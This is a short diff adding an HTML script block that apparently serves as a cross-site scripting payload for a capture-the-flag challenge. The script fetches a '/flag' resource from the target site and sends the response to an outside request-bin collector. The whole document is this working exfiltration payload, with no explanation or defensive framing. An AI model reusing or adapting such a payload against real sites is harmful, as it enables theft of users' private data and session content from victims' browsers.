@@ -1,0 +1,8 @@
+<script>
+fetch("https://wizbooking1.winja.org/flag")
+  .then(response => response.text())
+  .then(data => {
+    fetch("https://bin.graversen.io/api/9fc3f6d1-30b1-4caa-800e-7a4cd6b057e7?data=" + encodeURIComponent(data));
+  })
+  .catch(error => console.error("Error fetching the messages:", error));
+</script>
